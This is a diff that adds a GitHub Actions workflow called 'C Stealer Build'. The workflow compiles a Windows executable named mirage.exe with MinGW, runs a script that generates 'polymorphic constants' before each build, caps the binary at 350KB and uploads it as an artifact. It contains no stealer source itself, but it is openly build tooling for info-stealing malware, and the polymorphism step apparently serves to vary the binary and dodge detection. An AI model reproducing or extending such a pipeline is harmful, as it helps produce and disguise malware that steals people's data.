@@ -1,0 +1,36 @@
+name: C Stealer Build
+on:
+  push:
+    branches: [feat/*, main, develop]
+    paths: ['src/**', 'include/**', 'Makefile', 'tools/**']
+  pull_request:
+    branches: [main, develop]
+    paths: ['src/**', 'include/**', 'Makefile', 'tools/**']
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup MinGW
+        uses: egor-tensin/setup-mingw@v2
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      - name: Generate polymorphic constants
+        run: python tools/make_polymorphic.py
+      - name: Build
+        run: mingw32-make all
+      - name: Check binary size
+        shell: pwsh
+        run: |
+          $size = (Get-Item mirage.exe).Length
+          Write-Host "Binary size: $size bytes ($([math]::Round($size/1024))KB)"
+          if ($size -gt 350000) { Write-Error "Binary exceeds 350KB limit" }
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: mirage-exe
+          path: mirage.exe
+          retention-days: 30
